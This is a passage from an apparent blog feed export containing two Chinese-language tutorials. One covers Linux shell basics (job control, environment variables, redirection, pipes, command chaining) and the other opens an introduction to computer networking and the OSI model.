emacs<br></code></pre></td></tr></table></figure><p>　　在上述的终端窗口，中括号里面的数字称作“job id”。你可以用 <code>fg</code> 命令搭配“job id”，把某个后台进程切换到前台。<br>　　（在本例中）如果你想切换 emacs 到前台，就运行 <code>fg %2</code>，如果想切换 vim 就运行 <code>fg %1</code>（以此类推）</p><h3 id="◇引申阅读-1"><a href="#◇引申阅读-1" class="headerlink" title="◇引申阅读"></a>◇引申阅读</h3><p>　　想进一步了解“作业控制”，可以参考维基百科（<a href="https://en.wikipedia.org/wiki/Job_control_(Unix)">这个链接</a>）。</p><h2 id="★环境变量（environment-variable）"><a href="#★环境变量（environment-variable）" class="headerlink" title="★环境变量（environment variable）"></a>★环境变量（environment variable）</h2><h3 id="◇“环境变量”是啥？"><a href="#◇“环境变量”是啥？" class="headerlink" title="◇“环境变量”是啥？"></a>◇“环境变量”是啥？</h3><p>　　所谓的“环境变量”，你可以通俗理解为某种【名值对】——每个“环境变量”都有自己的【名称】和【值】。并且名称必须是【唯一】滴。</p><h3 id="◇如何添加并修改“环境变量”？"><a href="#◇如何添加并修改“环境变量”？" class="headerlink" title="◇如何添加并修改“环境变量”？"></a>◇如何添加并修改“环境变量”？</h3><p>　　在 bash（或兼容 bash 的其它 shell），你可以用 <code>export</code> 设置环境变量。比如下面这个命令行设置了一个“环境变量”，其名称是 <code>abc</code>，其值是 <code>xyz</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">abc</span>=xyz<br></code></pre></td></tr></table></figure><p>　　假如你要设置的【值】包含空格，记得用双引号引用该值（示例如下）。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">abc</span>=<span class="hljs-string">&quot;program think&quot;</span><br></code></pre></td></tr></table></figure><p>　　由于“环境变量”的名称具有【唯一性】，当你设置【同名】的“环境变量”就等同于对它的【修改】。</p><h3 id="◇如何查看“环境变量”？"><a href="#◇如何查看“环境变量”？" class="headerlink" title="◇如何查看“环境变量”？"></a>◇如何查看“环境变量”？</h3><p>　　设置完之后，你可以用 <code>env</code> 命令查看。该命令会列出【当前 shell】中的【全部】“环境变量”。</p><h3 id="◇“环境变量”的【可见性】和【可继承性】"><a href="#◇“环境变量”的【可见性】和【可继承性】" class="headerlink" title="◇“环境变量”的【可见性】和【可继承性】"></a>◇“环境变量”的【可见性】和【可继承性】</h3><p>　　某个进程设置的“环境变量”，其【可见性】仅限于该进程及其子进程（也就是“进程树”中，该进程所在的那个枝节）。<br>　　基于上述的【可见性】原则，你在某个 shell 中设置的“环境变量”，只在“该 shell 进程本身”，以及通过该 shell 进程启动的“其它子进程”，才能看到。</p><p>　　另外，如果系统关机，所有进程都会退出，那么你采用上一个小节（export 方式）设置的“环境变量”也就随之消失了。<br>　　为了让某个“环境变量”永久生效，需要把相应的 <code>export</code> 命令添加到该 shell 的初始化配置文件中。对于 bash 而言，也就是 <code>~/.bashrc</code> 或者 <code>~/.profile</code><br>　　估计有些同学会问：上述这两个初始化配置文件，有啥差别捏？<br>　　俺如果有空，会单独写一篇关于 bash 的定制教程，到时候再聊这个话题。</p><h3 id="◇“环境变量”有啥用？"><a href="#◇“环境变量”有啥用？" class="headerlink" title="◇“环境变量”有啥用？"></a>◇“环境变量”有啥用？</h3><p>　　通俗地说，“环境变量”是某种比较简单的“IPC 机制”（进程通讯机制），可以让两个进程共享某个简单的文本信息。<br>　　举例：<br>　　很多知名的软件（比如：curl、emacs）都支持“以环境变量设置代理”。<br>　　如果你按照它的约定，在 shell 中设置了约定名称和格式的“环境变量”，然后在【同一个】shell 中启动这个软件，（由于环境变量的【可继承性】）该软件就会看到这个“环境变量”，并根据“环境变量”包含的信息，设置代理。</p><h2 id="★“标准流”（standard-stream）与“重定向”（redirection）"><a href="#★“标准流”（standard-stream）与“重定向”（redirection）" class="headerlink" title="★“标准流”（standard stream）与“重定向”（redirection）"></a>★“标准流”（standard stream）与“重定向”（redirection）</h2><h3 id="◇进程的3个“标准流”"><a href="#◇进程的3个“标准流”" class="headerlink" title="◇进程的3个“标准流”"></a>◇进程的3个“标准流”</h3><p>　　在 POSIX 系统（Linux ＆ UNIX）中，每个进程都内置了三个“标准流”（<a href="https://en.wikipedia.org/wiki/Standard_streams">standard stream</a>），分别称作：“标准输入流”（stdin），“标准输出流”（stdout），“标准错误输出流”（stderr）。<br>　　当进程启动后，在默认情况下，stdin 对接到终端的【输入】；stdout ＆ stderr 对接到终端的【输出】。示意图如下：</p><p><img src="https://lh4.googleusercontent.com/JEfAB2UXDSRwczojJZOXEDAK5xH4E6YdksxZuIqq_5Tfe6xjwHrbeYX5EETlsHxQYk1Wm_wXg-ajpjIu3lHzYLeYJML5xxQQgsuhnZodUcC5jbtdLQ7_AflDdUkEfAthqHqBly3CQPo" alt="不见图 请翻墙"><br>（三个【标准流】的示意图）</p><p>　　如果你是程序员，俺补充一下：<br>　　当你在程序中打开某个文件，会得到一个“文件描述符”（洋文叫“<a href="https://en.wikipedia.org/wiki/File_descriptor">file descriptor</a>”，简称 fd）。fd 本身是个整数，程序员可以通过 fd 对该文件进行读写。<br>　　而进程的三个【标准流】，就相当于是三个特殊的 fd。当进程启动时，操作系统就已经把这三个 fd 准备好了。<br>　　由于这三个玩意儿是预先备好滴，所以它们的数值分别是：0、1、2（参见上图中 # 后面的数字）。</p><h3 id="◇演示“标准流”的实际效果"><a href="#◇演示“标准流”的实际效果" class="headerlink" title="◇演示“标准流”的实际效果"></a>◇演示“标准流”的实际效果</h3><p>　　在本文前面的某个章节，俺已经用 gif 动画演示了终端的“行模式”。<br>　　动画中的 <code>cat</code> 命令同样可以用来演示“标准输入输出”。俺把那个动画再贴一次。</p><p><img src="https://lh5.googleusercontent.com/PPet_RllllnSmYALmxV56ohy5NZz1kj76GzbmcvM9HJDrqY6h74otCFL1E0rG_lEKnALViM8zv2E4BOj4bUUTixzD_QTTXsmoh0-U3dxJROpiAfvW2vHZ69s2vpYlq88-6FBngqgzSQ" alt="不见图 请翻墙"><br>（动画：“标准输入输出”的效果）</p><p>　　请注意，第1行 <code>test</code> 是针对 <code>cat</code> 进程的【输入】，对应于【stdin】（你之所以能看到这行，是因为前面所说的【终端回显】）<br>　　第2行 <code>test</code> 是 <code>cat</code> 进程拿到输入文本之后的原样输出，对应于【stdout】。</p><h3 id="◇“标准流”的【重定向】"><a href="#◇“标准流”的【重定向】" class="headerlink" title="◇“标准流”的【重定向】"></a>◇“标准流”的【<a href="https://en.wikipedia.org/wiki/Redirection_(computing)">重定向</a>】</h3><p>　　所谓的【重定向】大体上分两种：</p><p><strong>1. 【输入流】重定向</strong><br>　　把某个文件重定向为 stdin；此时进程通过 stdin 读取的是该文件的内容。<br>　　这种玩法使用小于号（<code>&lt;</code>）</p><p><strong>2. 【输出流】重定向</strong><br>　　把 stdout 重定向到某个文件；此时进程写入 stdout 的内容会【覆盖 or 追加】到这个文件。<br>　　这种玩法使用【单个】大于号（<code>&gt;</code>）或【两个】大于号（<code>&gt;&gt;</code>）。前者用于【覆盖】文件内容，后者用于【追加】文件内容。</p><p>　　另外，有时候你会看到 <code>2&gt;&amp;1</code> 这种写法。它表示：把 stderr 合并到 stdout。<br>　　（注：前面俺提到过——stdout 是“数值为 1 的文件描述符”；stderr 是“数值为 2 的文件描述符”）</p><h3 id="◇【重定向】举例"><a href="#◇【重定向】举例" class="headerlink" title="◇【重定向】举例"></a>◇【重定向】举例</h3><p><strong>cat 的例子</strong><br>　　下面这个命令把某个文件重定向到 <code>cat</code> 的 stdin。</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-built_in">cat</span> &lt; 文件名<br></code></pre></td></tr></table></figure><p>　　很多菜鸟容易把上面的命令与下面的命令搞混淆。<br>　　请注意：上面的命令用的是【输入重定向】，而下面的命令用的是【命令行参数】。</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-built_in">cat</span> 文件名<br></code></pre></td></tr></table></figure><p><code>cat</code> 命令还可以起到类似“文件复制”的效果。<br>　　比如你已经有个 <code>文件1</code>，用下面这种玩法，会创建出一个内容完全相同的 <code>文件2</code>。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span> &lt; 文件<span class="hljs-number">1</span> &gt; 文件<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>　　某些同学可能会问了：既然能这么玩，为啥还需要用 <code>cp</code> 命令进行文件复制捏？<br>　　原因在于：<code>cat</code> 的玩法，只保证内容一样，其它的不管；而 <code>cp</code> 除了复制文件内容，还会确保“目标文件”与“源文件”具有相同的属性（比如 mode）。</p><p><strong>更多的例子</strong><br>　　在之前那篇《<a href="https://program-think.blogspot.com/2019/09/Netcat-Tricks.html">扫盲 netcat（网猫）的 N 种用法——从“网络诊断”到“系统入侵”</a>》，里面介绍了十多种 nc 的玩法。很多都用到了【重定向】。</p><h2 id="★匿名管道（anonymous-pipe）"><a href="#★匿名管道（anonymous-pipe）" class="headerlink" title="★匿名管道（anonymous pipe）"></a>★匿名管道（anonymous pipe）</h2><h3 id="◇“匿名管道”的【原理】"><a href="#◇“匿名管道”的【原理】" class="headerlink" title="◇“匿名管道”的【原理】"></a>◇“匿名管道”的【原理】</h3><p>　　在大部分 shell 中，使用竖线符号（<code>|</code>）来表示【管道符】。用它来创建一个【<a href="https://en.wikipedia.org/wiki/Anonymous_pipe">匿名管道</a>】，使得前一个命令（进程）的“标准输出”关联到后一个命令（进程）的“标准输入”。</p><h3 id="◇举例"><a href="#◇举例" class="headerlink" title="◇举例"></a>◇举例</h3><p>　　俺曾经在“<a href="https://program-think.blogspot.com/2013/01/cross-host-use-gfw-tool.html">这篇博文</a>”中介绍过——如何用 <code>netstat</code> 查看当前系统的监听端口。<br>　　对于 Windows 系统，可以用如下命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netstat -an | <span class="hljs-builtin-name">find</span> <span class="hljs-string">&quot;LISTEN&quot;</span><br></code></pre></td></tr></table></figure><p>　　对于 POSIX 系统，可以用如下命令：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">netstat -an <span class="hljs-string">| grep &quot;</span>LISTEN<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>　　在上述两个例子中，都用到了【管道符】。因为 <code>netstat -an</code> 这个命令的输出可能会很多，先把它的输出通过【匿名管道】丢给某个专门负责过滤的命令（比如：POSIX 的 grep 或 Windows 的find）。当这个过滤命令拿到 <code>netstat</code> 的输出内容，再根据你在命令行参数中指定的【关键字】（也就是上述例子中的 <code>LISTEN</code>），过滤出包含【关键字】的那些【行】。<br>　　最终，你看到的是“过滤命令”（grep 或 find）的输出。</p><h3 id="◇【串联的】匿名管道（chained-pipeline）"><a href="#◇【串联的】匿名管道（chained-pipeline）" class="headerlink" title="◇【串联的】匿名管道（chained pipeline）"></a>◇【串联的】匿名管道（chained pipeline）</h3><p>　　前面的例子，可以用来列出当前系统中所有的监听端口。<br>　　现在，假设你运行了 Tor Browser，然后想看看它到底有没有开启 <code>9150</code> 这个监听端口，那么你就可以在上述命令中进行【二次过滤】（具体命令大致如下）。这就是所谓的【串联】。</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">netstat -an | <span class="hljs-type">grep</span> <span class="hljs-string">&quot;LISTEN&quot;</span> | <span class="hljs-type">grep</span> <span class="hljs-string">&quot;9150&quot;</span><br></code></pre></td></tr></table></figure><h3 id="◇“匿名管道”与“作业”（进程组）"><a href="#◇“匿名管道”与“作业”（进程组）" class="headerlink" title="◇“匿名管道”与“作业”（进程组）"></a>◇“匿名管道”与“作业”（进程组）</h3><p>　　用“匿名管道”串起来的多个进程，构成一个“作业”（这点前面提到了）。<br>　　你可以尝试执行某个长寿命的，带管道符的命令行，然后用 <code>Ctrl + Z</code> 切到后台，再执行 <code>jobs</code> 看一下，就能看出——该命令行对应的【多个】进程属于同一个 job。</p><h2 id="★批处理（batch）"><a href="#★批处理（batch）" class="headerlink" title="★批处理（batch）"></a>★批处理（batch）</h2><h3 id="◇啥是“批处理”？"><a href="#◇啥是“批处理”？" class="headerlink" title="◇啥是“批处理”？"></a>◇啥是“批处理”？</h3><p>　　通俗地说就是：同时执行多个命令。<br>　　为了支持“批处理”，shell 需要提供若干语法规则。而且不同类型的 shell，用来搞“批处理”的语法规则也存在差异。<br>　　在本章节中，俺以 bash 来举例。</p><h3 id="◇【无】条件的“批处理”"><a href="#◇【无】条件的“批处理”" class="headerlink" title="◇【无】条件的“批处理”"></a>◇【无】条件的“批处理”</h3><p>　　如果你把多个命令写在同一行，并且命令之间用半角分号隔开，这种玩法就属于【无条件】的批处理执行。<br>　　举例：<br>　　假设当前目录下有一个 <code>abc.txt</code> 文件，然后要在当前目录下创建一个名为 <code>xxx</code> 的子目录，并把 <code>abc.txt</code> 移动到这个新创建的子目录中。你可以用如下方式搞定（只用【一行】命令）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mkdir .<span class="hljs-regexp">/xxx/</span>; mv abc.txt .<span class="hljs-regexp">/xxx/</span><br></code></pre></td></tr></table></figure><p>　　为啥这种方式叫做“【无条件】批处理”捏？因为不管前一个“子命令”是否成功，都会继续执行下一个“子命令”。</p><p>　　请注意：<br>　　虽然俺上述举例只使用了两个“子命令”，但实际上这种玩法可以把 N 个“子命令”串起来。</p><h3 id="◇【有】条件的“批处理”"><a href="#◇【有】条件的“批处理”" class="headerlink" title="◇【有】条件的“批处理”"></a>◇【有】条件的“批处理”</h3><p>　　与“无条件”相对应的，当然是“有条件”啦。<br>　　这种玩法的意思是——后一个“子命令”是否执行，取决于【前一个】“子命令”的结果（成功 or 失败）。<br>　　（注：如何界定“成功/失败”，请参见前面某个章节聊到的【进程退出码】）<br>　　【有】条件的批处理，常见的方式有两种，分别是【逻辑与】、【逻辑或】。</p><p><strong>逻辑与（语法：<code>&amp;&amp;</code>）</strong><br>　　只要前面的某个“子命令”【失败】了，就【不再】执行后续的“子命令”。<br>　　举例：<br>　　还是拿前一个小节的例子。如下方式使用了“逻辑与”。如果创建子目录失败，就【不再】执行“移动文件”的操作</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mkdir .<span class="hljs-regexp">/xxx/</span> &amp;&amp; mv abc.txt .<span class="hljs-regexp">/xxx/</span><br></code></pre></td></tr></table></figure><p><strong>逻辑或（语法：<code>||</code>）</strong><br>　　只要前面的某个“子命令”【成功】了，就【不再】执行后续的“子命令”。<br>　　举例：<br>　　把上述例子进一步扩充，变为如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mkdir .<span class="hljs-regexp">/xxx/</span> &amp;&amp; mv abc.txt .<span class="hljs-regexp">/xxx/</span> || echo <span class="hljs-string">&quot;FAILED!!!&quot;</span><br></code></pre></td></tr></table></figure><p>　　这个有点复杂，俺稍微解释一下：<br>　　你把前面两句看作一个【整体】。其执行的逻辑参见前面所说的“逻辑与”。然后这个“整体”与后面的那句 <code>echo</code> 再组合成【逻辑或】的关系。<br>　　也就是说，如果前面的“整体”成功了，那么就【不】执行 <code>echo</code>（【不】打印错误信息）；反之，如果前面的“整体”失败了，就会打印错误信息。</p><h2 id="★shell-脚本"><a href="#★shell-脚本" class="headerlink" title="★shell 脚本"></a>★shell 脚本</h2><p>　　虽然前一个章节拿 bash 来举例。但其实有很多其它类型的 shell 都支持类似的“批处理”机制。<br>　　只要某个 shell 支持刚才所说的【有条件批处理】的机制，它就已经很接近【编程语言】了。<br>　　于是很自然地，那些 shell 的作者就会把 shell 逐步发展成某种【脚本语言】的解释器。然后就有了如今的“shell script”（shell 脚本）和“shell 编程”。<br>　　由于“shell 编程”这个话题比较大。哪怕俺只聊 bash 这一类 shell 的编程，也足够写上几万字的博文。考虑到本文已经很长了，这个话题就不再展开。<br>　　对此感兴趣的同学，可以参考俺分享的电子书。具体参见<a href="https://github.com/programthink/books">电子书清单</a>的如下几本（这几本都位于【IT类 / 操作系统 / 使用教程】分类目录下）<br>《<a href="https://docs.google.com/document/d/1Zw8XD56F6rCi899UxIE-0sKoXWr2WGqiUNcRl70kIYk/">Shell 脚本学习指南</a>》（Classic Shell Scripting）<br>《<a href="https://docs.google.com/document/d/1Nk83xAbRUdcgqUBSfDCwozA3-EUFeBz-nrpf1G7x-j0/">Linux 与 UNIX Shell 编程指南</a>》（Linux and UNIX Shell Programming）<br>《<a href="https://docs.google.com/document/d/1BYSgrSViVZyDTQcuhWEFAc_uc0YZvkIoQYLmv0yWo_A/">高级 Bash 脚本编程指南</a>》（Advanced Bash-Scripting Guide）</p><h2 id="★结尾"><a href="#★结尾" class="headerlink" title="★结尾"></a>★结尾</h2><p>　　由于这篇涉及的内容比较杂，跨度也比较大。可能会有一些俺没覆盖到的地方。欢迎在博客留言中补充。<br>　　如果你发现本文的错误之处，也欢迎批评指正 :)</p>]]></content>
      
      
      <categories>
          
          <category> 编程随想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> programthink </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大话计算机网络</title>
      <link href="/2021/07/16/%E5%A4%A7%E8%AF%9D%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
      <url>/2021/07/16/%E5%A4%A7%E8%AF%9D%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="计算机网络通讯的【系统性】扫盲——从“基本概念”到“OSI-模型”"><a href="#计算机网络通讯的【系统性】扫盲——从“基本概念”到“OSI-模型”" class="headerlink" title="计算机网络通讯的【系统性】扫盲——从“基本概念”到“OSI 模型”"></a>计算机网络通讯的【系统性】扫盲——从“基本概念”到“OSI 模型”</h1><p><strong>文章目录</strong></p><p>★本文的目标读者<br>★基本概念<br>★从“分层”到“参考模型”<br>★OSI 概述<br>★物理层：概述<br>★物理层：具体实例<br>★链路层：概述<br>★链路层：具体实例<br>★网络层：概述<br>★网络层：具体实例<br>★传输层：概述<br>★传输层：具体实例<br>★业务层（OSI 上三层）：概述<br>★业务层（OSI 上三层）：具体实例<br>★杂项<br>★参考书目</p><p>　　近期老是在写政治博文，又有两个月左右没写技术博文了。某些技术型的读者，背地里肯定骂俺太懒。今天搞了一篇内容特别长，信息量特别多的。喜欢看技术博文的读者，可以慢慢消化。</p><h2 id="★本文的目标读者"><a href="#★本文的目标读者" class="headerlink" title="★本文的目标读者"></a>★本文的目标读者</h2><p>　　今天这篇的标题是“扫盲”，也就是说：即使那些完全不懂 IT 领域，也不懂通讯领域的读者，依然能看懂（至少能看懂一部分）。为了做到这点，俺会尽量使用通俗的比喻，并适当加一些示意图。<br>　　另外，就算你已经比较了解网络通讯领域，本文中提到的某些部分，也可能是你所不知道的。也就是说：懂行的同学，看看此文，也会有帮助。<br>　　本文的标题特地强调了【系统性】——俺希望这篇教程能帮助读者对“计算机网络”这个领域进行系统性学习（何为“系统性学习”？请看<a href="https://program-think.blogspot.com/2019/10/Systematic-Learning.html">这篇教程</a>）<br>　　为了做到【系统性】这个目的，这篇教程很长。俺开博12年，这篇的长度估计能排到前5名。建议大伙儿慢慢看，不要着急。</p><h2 id="★基本概念"><a href="#★基本概念" class="headerlink" title="★基本概念"></a>★基本概念</h2><p>　　为了足够通俗，俺先要介绍一些基本概念。</p><h3 id="◇信道（channel）"><a href="#◇信道（channel）" class="headerlink" title="◇信道（channel）"></a>◇信道（<a href="https://en.wikipedia.org/wiki/Communication_channel">channel</a>）</h3><p>　　这是通讯领域非常基本的概念，肯定要先聊聊它。<br>　　通俗地说，信道就是“传送信息的通道”。</p><h3 id="◇信道的类型"><a href="#◇信道的类型" class="headerlink" title="◇信道的类型"></a>◇信道的类型</h3><p>　　首先，信道可以从广义上分为“物理信道 ＆ 逻辑信道”。<br>　　顾名思义，“物理信道”就是直接使用某种【物理介质】来传送信息；至于“逻辑信道”——是基于“物理信道”之上抽象出来的玩意儿（待会儿讲到“协议栈”的时候再聊）。</p><h3 id="◇信道的带宽"><a href="#◇信道的带宽" class="headerlink" title="◇信道的带宽"></a>◇信道的带宽</h3><p>　　“带宽”指的是：某个信道在单位时间内最大能传输多少比特的信息。<br>　　请注意：<br>　　电气领域 ＆ 计算机领域都有“带宽”这个概念，但两者的定义不太一样。电气领域所说的“带宽”指的是“模拟带宽”，单位是“赫兹/Hz”；计算机领域所说的“带宽”指“数字带宽”，单位是“比特率”或“字节率”。<br>　　后续章节提到“带宽”，都是指计算机领域的术语。</p><h3 id="◇带宽的单位——容易把外行绕晕"><a href="#◇带宽的单位——容易把外行绕晕" class="headerlink" title="◇带宽的单位——容易把外行绕晕"></a>◇带宽的单位——容易把外行绕晕</h3><p>　　“比特率”或“字节率”很容易搞混淆。用英文表示的话——大写字母 <code>B</code> 表示【字节】；小写字母 <code>b</code> 表示【比特】。</p><p>　　由于带宽的数字通常很大，要引入“K、M、G”之类的字母表示数量级，于是又引出一个很扯蛋的差异——“10进制”与“2进制”的差异。<br>　　【10进制】的 <code>K</code> 表示 1000；<code>M</code> 表示 1000x1000（1百万）<br>　　【2进制】的 <code>K</code> 表示 1024（2的10次方）；<code>M</code> 表示 1024x1024（2的20次方）<br>　　为了避免扯皮，后来国际上约定了一个规矩：对【2进制】的数量级要加一个小写字母 <code>i</code>。比如说：<code>Ki</code> 表示 1024；<code>Mi</code> 表示 1024x1024 …… 以此类推。<br>　　举例：<br>　　1Kbps 表示“1000比特每秒”<br>　　1KiBps 表示“1024字节每秒”</p><h3 id="◇信道的工作模式：单工-VS-半双工-VS-全双工"><a href="#◇信道的工作模式：单工-VS-半双工-VS-全双工" class="headerlink" title="◇信道的工作模式：单工 VS 半双工 VS 全双工"></a>◇信道的工作模式：单工 VS 半双工 VS 全双工</h3><p>　　再来说说信道的工作模式。大致可以分为如下三种。为了让大伙儿比较好理解，俺对每一种都举相应的例子。</p><p><strong>单工（simplex）</strong><br>　　比如“电台广播”就是典型的【单工】。“电台”可以发信号给“收音机”，但“收音机”【不能】发信号给“电台”。</p><p><strong>半双工（half-duplex）</strong><br>　　比如“单条铁路轨道”，就是典型的【半双工】。火车在单条铁轨上，可以有两种运行方向；但对于同一个瞬间，只能选其中一个方向（否则就撞车了）。</p><p><strong>全双工（full-duplex）</strong><br>　　比如“光纤”就是典型的【全双工】。在同一根光导纤维中，可以有多个光束【同时相向】传播，互相不会干扰对方。</p><h3 id="◇端点"><a href="#◇端点" class="headerlink" title="◇端点"></a>◇端点</h3><p>　　为了叙述方便，俺把参与通讯的对象（主体）称作“通讯端点”，简称“端点”。<br>　　这里的“端点”是广义的，可以是硬件（比如某个网卡），也可以是软件（比如某个应用程序）。</p><h3 id="◇单播、组播-多播、广播、选播"><a href="#◇单播、组播-多播、广播、选播" class="headerlink" title="◇单播、组播/多播、广播、选播"></a>◇单播、组播/多播、广播、选播</h3><p>　　对于“网络通讯”，至少得有 N 个端点参与，并且【N ≥ 2】才有意义。<br>　　当 N 个端点构成一个网络，这时候就会涉及到“单播、组播、广播”这几个概念。<br>　　通俗地说：<br>单播（unicast）——发送给网络中的指定的【单个】端点<br>组播/多播（multicast）——发送给网络中的指定的【多个】端点<br>广播（broadcast）——发送给网络中的【所有】端点<br>选播（anycast）——发送给网络中随机选择的【单个】端点</p><h3 id="◇通讯协议（protocol）"><a href="#◇通讯协议（protocol）" class="headerlink" title="◇通讯协议（protocol）"></a>◇通讯协议（protocol）</h3><p>　　所谓的“通讯协议”就是：参与通讯的各方所采用的某种【约定】。只有大家都遵守这个约定，才有可能相互传递信息。<br>　　打个比方：如果两个人要用自然语言交流，前提是：双方使用相同（或相互兼容）的自然语言。<br>　　“通讯协议”就类似某种自然语言，参与通讯的多个端点，都必须能理解这个语言。</p><h2 id="★从“分层”到“参考模型”"><a href="#★从“分层”到“参考模型”" class="headerlink" title="★从“分层”到“参考模型”"></a>★从“分层”到“参考模型”</h2><h3 id="◇分层"><a href="#◇分层" class="headerlink" title="◇分层"></a>◇分层</h3><p>　　在聊“分层”之前，先说说“分工”。比如在一个公司中，通常设有不同的工种/岗位，这就【分工】。<br>　　对于网络通讯也是如此，不太可能用一种通讯协议完成所有的信息传递任务（注：对于特别简单的网络，或许有可能只用单一协议；但如今的网络通讯已经很复杂，用【单个】通讯协议包办所有事情，已经不太可能）<br>　　一旦采用了多种通讯协议，这几种协议之间，该如何配合捏？<br>　　在网络通讯领域，采用的是【分层】的设计思路。多个层次的协议在一起协同工作，技术上称作“协议栈”（洋文叫做“protocol stack”）。</p><h3 id="◇协议栈的原理"><a href="#◇协议栈的原理" class="headerlink" title="◇协议栈的原理"></a>◇协议栈的原理</h3><p>　　对于多层次的协议栈。每个层次都有各自的“端点”（进行通讯的主体）。处于【同一层次】的两个端点会使用该层次的协议进行通讯（注：同一个层次的协议，可能只有一个，也可能有多个）。<br>　　除了最顶层，每个层次的端点会向其【直接】上层提供“服务”；除了最底层，每个层次的端点会调用【直接】下层提供的“服务”（这里所说的“服务”指某种“编程接口”，技术行话叫 API）。</p><p><img src="https://lh3.googleusercontent.com/bK34KOVTYWmZNuIOY-0CxbJn1tR8LV_-78VflTiRK3rFM_YjVPa6lSbdxU58ICNFqTo2ghGjicgekyoZ4CNdFDe7ucMEM3BVHDA48S44mNn7e7Rf-5L3XDxYrjGDUpFp3AvkLDxb78w" alt="不见图 请翻墙"><br>（“协议栈”的示意图）</p><p><img src="https://lh5.googleusercontent.com/qfAnnow_Fl7VudJd1GS39MJxLfXymYvKQ7ISRvYoSG4RKl8AltCB2Ru86zf78ABHd3ZrzI6sNF9Z65I9z8-He26A7hSInp-Pf2Quduw26FHGWMb2VK5YK-yLWnG8F2UibWqgzYwGSaU" alt="不见图 请翻墙"><br>（“服务”与“协议”之间的关系）</p><h3 id="◇逻辑信道"><a href="#◇逻辑信道" class="headerlink" title="◇逻辑信道"></a>◇逻辑信道</h3><p>　　（前一个小节说了）每个层次会向上一个层次提供服务（API 调用）。对上层而言，调用下层提供的 API 发送信息，其效果相当于在使用某种【信道】进行通讯，这也就是俺在 ★基本概念 那个章节所说的“逻辑信道”。</p><p><img src="https://lh4.googleusercontent.com/OzflASXF1Xv5c3-eg-RiT4ENcwjZx4jpeVYlj01YI6I-1L-Wgjl3FE47Rc94Dn9JAcTnHGcEES1KcaSSjHkZQeG1iKWgamZWrMtC0QTMpbHnO7NQeZvuMIeS9Sx8pI7gNg7DlakovkY" alt="不见图 请翻墙"><br>（“逻辑信道”示意图）</p><h3 id="◇数据格式的原理"><a href="#◇数据格式的原理" class="headerlink" title="◇数据格式的原理"></a>◇数据格式的原理</h3><p>　　大部分协议会把要传送的数据切割为 N 份，每一份就是一个数据包。<br>　　通常来说，数据包的格式有如下三部分：</p><blockquote><p>头部<br>身体（也称作“有效载荷”）<br>尾部（注：很多协议没有尾部）</p></blockquote><p>　　如果你收过快递，可以把“网络数据包”与“快递包裹”作一个对照——<br>数据包的“头/尾”，就类似于快递包裹的【包装袋】。数据包的“身体”，就类似于快递包裹里面的东西。</p><p>　　对于【相邻】两层的协议，【下】层包含【上】层。也就是说：下层协议的【载荷】就是上层协议的【整体】。<br>　　还是以快递举例：<br>　　假设你从网上买了一台笔记本电脑。电脑出厂时，电脑厂商肯定会提供一个包装盒。快递公司在寄送这台笔记本的时候，又会在笔记本的盒子外面再加一个包装袋。对应到网络协议——“快递公司的包装袋”相当于【下层】协议；“电脑厂商的包装盒”，相当于【上层】协议。</p><p><img src="https://lh3.googleusercontent.com/bz_Gg8ow_9ZM4dqw9wEfGaEXZmpusHPT9pwhILsvusYq6XPZa__M5GsfF07xCnoAV-S2udQ0unbuAbUgWqx9vCgF71t7RgQhsgkNL6Ol76wueKdvWU-nukPat8i7VlVFXs2FDrthrt0" alt="不见图 请翻墙"><br>（上下层协议的格式及包含关系）</p><h3 id="◇网络分层的参考模型"><a href="#◇网络分层的参考模型" class="headerlink" title="◇网络分层的参考模型"></a>◇网络分层的参考模型</h3><p>　　上述所说的“分层 ＆ 协议栈”只是一个抽象的（笼统的）思路。具体要分几层？每一层要干啥事儿？这些都是很有讲究滴！网络技术发展了几十年，已经有很多牛人提出了各种不同的划分方案，称之为“网络分层的参考模型”（为了打字省力，以下简称“模型”）。<br>　　在各种模型中，名气最大的当然是“OSI 模型”（洋文称作“<a href="https://en.wikipedia.org/wiki/OSI_model">OSI model</a>”）。在后续的章节中，俺会以这个模型为主体，进行介绍。<br>　　除了“OSI 模型”还有一个很出名的模型是“TCP/IP 模型”（因为互联网很成功，它才跟着出名）。<br>　　对“TCP/IP 模型”的分层，不同的文章或书籍，说法不太一样（“3层、4层、5层”皆有），这就引发了一些争议。包括几位热心读者也在博客留言，表达不同意见。为了避免一家之言，贴出维基百科的“<a href="https://en.wikipedia.org/wiki/Internet_protocol_suite#Layer_names_and_number_of_layers_in_the_literature">这个链接</a>”，其中给出了几种比较有名的说法。<br>　　